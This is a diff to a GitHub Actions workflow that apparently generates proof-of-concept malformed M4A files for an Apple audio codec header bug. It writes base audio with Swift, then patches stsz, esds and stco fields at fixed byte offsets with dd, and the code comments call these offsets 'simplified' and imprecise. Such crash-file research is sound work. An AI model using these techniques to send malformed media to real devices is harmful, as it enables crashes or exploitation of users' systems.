@@ -48,22 +48,69 @@ jobs:
         with:
           xcode-version: '16.1'
 
-      # Verify Xcode and clang version
-      - name: Verify Xcode and clang version
+      # Create generate_pocs.swift
+      - name: Create generate_pocs.swift
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Verifying Xcode and clang versions at $(date)"
-          xcodebuild -version
-          clang++ --version
-          xcrun --sdk macosx --show-sdk-path
-          echo "Verification completed at $(date)"
+          echo "Creating generate_pocs.swift at $(date)"
+          cat << 'EOF' > generate_pocs.swift
+          import AVFoundation
+          import Foundation
 
-      # Check system resources
-      - name: Check system resources
-        run: |
-          echo "Checking system resources at $(date)"
-          df -h
-          system_profiler SPHardwareDataType
-          echo "System resource check completed at $(date)"
+          func generateBaseM4A(filename: String, duration: Double, channels: Int, sampleRate: Double) throws {
+              let outputURL = URL(fileURLWithPath: filename)
+              let format = AVAudioFormat(standardFormatWithSampleRate: sampleRate, channels: UInt32(channels))!
+              let frameCount = UInt32(duration * sampleRate)
+              let buffer = AVAudioPCMBuffer(pcmFormat: format, frameCapacity: frameCount)!
+              buffer.frameLength = frameCount
+              if let floatData = buffer.floatChannelData {
+                  for channel in 0..<Int(format.channelCount) {
+                      memset(floatData[channel], 0, Int(frameCount) * MemoryLayout<Float>.size)
+                  }
+              }
+              let writer = try AVAssetWriter(outputURL: outputURL, fileType: .m4a)
+              let settings: [String: Any] = [
+                  AVFormatIDKey: kAudioFormatMPEG4AAC,
+                  AVSampleRateKey: sampleRate,
+                  AVNumberOfChannelsKey: channels,
+                  AVEncoderBitRateKey: 128000
+              ]
+              let audioInput = AVAssetWriterInput(mediaType: .audio, outputSettings: settings)
+              writer.add(audioInput)
+              writer.startWriting()
+              writer.startSession(atSourceTime: .zero)
+              audioInput.append(buffer)
+              audioInput.markAsFinished()
+              writer.finishWriting {
+                  print("Generated \(filename)")
+              }
+              while writer.status == .writing {
+                  Thread.sleep(forTimeInterval: 0.1)
+              }
+              if writer.status == .failed {
+                  throw writer.error ?? NSError(domain: "AVAssetWriter", code: -1, userInfo: nil)
+              }
+          }
+
+          func main() {
+              let sampleRate = 44100.0
+              let duration = 1.0
+              let channels = 2
+              for i in 1...5 {
+                  let filename = "base_poc\(i).m4a"
+                  do {
+                      try generateBaseM4A(filename: filename, duration: duration, channels: channels, sampleRate: sampleRate)
+                  } catch {
+                      print("Error generating \(filename): \(error)")
+                      exit(1)
+                  }
+              }
+          }
+
+          main()
+          EOF
+          ls -l generate_pocs.swift
+          echo "generate_pocs.swift created at $(date)"
 
       # Create PoC source files
       - name: Create PoC source files
@@ -97,52 +144,45 @@ jobs:
           ls -l encodeme_poc*.mm
           echo "PoC source files created at $(date)"
 
-      # Compile PoC binaries
-      - name: Compile PoC binaries
+      # Generate base M4A files
+      - name: Generate base M4A files
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Compiling PoC binaries at $(date)"
-          for poc in {1..5}; do
-            echo "Compiling encodeme_poc$poc.mm"
-            clang++ -g -Os -std=c++2b -fmodules -fcxx-modules -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk macosx --show-sdk-path) -framework AVFAudio -framework AudioToolbox encodeme_poc$poc.mm -o encodeme_poc$poc
-            if [ $? -eq 0 ]; then
-              echo "Compilation successful for encodeme_poc$poc"
-              ls -l encodeme_poc$poc
-              BINARY_SIZE=$(stat -f %z encodeme_poc$poc 2>/dev/null || stat -c %s encodeme_poc$poc 2>/dev/null)
-              echo "Binary size: $BINARY_SIZE bytes"
-            else
-              echo "Compilation failed for encodeme_poc$poc"
-              exit 1
-            fi
-          done
-          echo "PoC binaries compiled at $(date)"
+          echo "Generating base M4A files at $(date)"
+          swift generate_pocs.swift
+          ls -l base_poc*.m4a
+          echo "Base M4A files generated at $(date)"
 
-      # Run PoC binaries to generate M4A files
-      - name: Run PoC binaries
+      # Manipulate M4A files for PoCs
+      - name: Manipulate M4A files for PoCs
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Running PoC binaries at $(date)"
-          for poc in {1..5}; do
-            echo "Running encodeme_poc$poc"
-            chmod +x encodeme_poc$poc
-            ./encodeme_poc$poc
-            if [ $? -eq 0 ]; then
-              echo "encodeme_poc$poc executed successfully"
-              if ls output_*.m4a >/dev/null 2>&1; then
-                mv output_*.m4a poc${poc}.m4a
-                ls -l poc${poc}.m4a
-              else
-                echo "No M4A file generated for poc$poc"
-                exit 1
-              fi
-            else
-              echo "encodeme_poc$poc execution failed"
-              exit 1
-            fi
-          done
-          echo "PoC binaries executed at $(date)"
+          echo "Manipulating M4A files for PoCs at $(date)"
+          # PoC 1: Inflate stsz sample count
+          cp base_poc1.m4a poc1.m4a
+          # Adjust stsz atom (simplified, requires hex edit for precision)
+          printf '\x00\x00\x00\x00\x00\x00\x20\x00' | dd of=poc1.m4a bs=1 seek=1000 conv=notrunc 2>/dev/null
+          
+          # PoC 2: esds channel mismatch
+          cp base_poc2.m4a poc2.m4a
+          # Set esds channel count to 8 (simplified)
+          printf '\x00\x08' | dd of=poc2.m4a bs=1 seek=1100 conv=notrunc 2>/dev/null
+          
+          # PoC 3: Prepare for Xing metadata
+          cp base_poc3.m4a poc3.m4a
+          
+          # PoC 4: Bitrate mismatch
+          cp base_poc4.m4a poc4.m4a
+          
+          # PoC 5: stco offset overflow
+          cp base_poc5.m4a poc5.m4a
+          # Set invalid stco offset (simplified)
+          printf '\xFF\xFF\xFF\xFF' | dd of=poc5.m4a bs=1 seek=1200 conv=notrunc 2>/dev/null
+          
+          ls -l poc*.m4a
+          echo "M4A files manipulated at $(date)"
 
-      # Convert M4A to MP3 and add Xing metadata for PoC 3
+      # Convert M4A to MP3
       - name: Convert M4A to MP3
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
@@ -194,15 +234,6 @@ jobs:
           done
           echo "Generated files verified at $(date)"
 
-      # Collect crash reports
-      - name: Collect crash reports
-        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
-        run: |
-          echo "Collecting crash reports at $(date)"
-          mkdir -p crash_reports
-          cp ~/Library/Logs/DiagnosticReports/encodeme*.crash crash_reports/ 2>/dev/null || echo "No crash reports found"
-          ls -lh crash_reports/ 2>/dev/null || echo "No crash reports copied"
-
       # Upload artifacts
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
@@ -211,6 +242,6 @@ jobs:
           path: |
             AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.m4a
             AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.mp3
-            AppleTest/apple-positional-audio-codec-invalid-header-main/crash_reports/*.crash
+            AppleTest/apple-positional-audio-codec-invalid-header-main/encodeme_poc*.mm
           retention-days: 7
           if-no-files-found: error
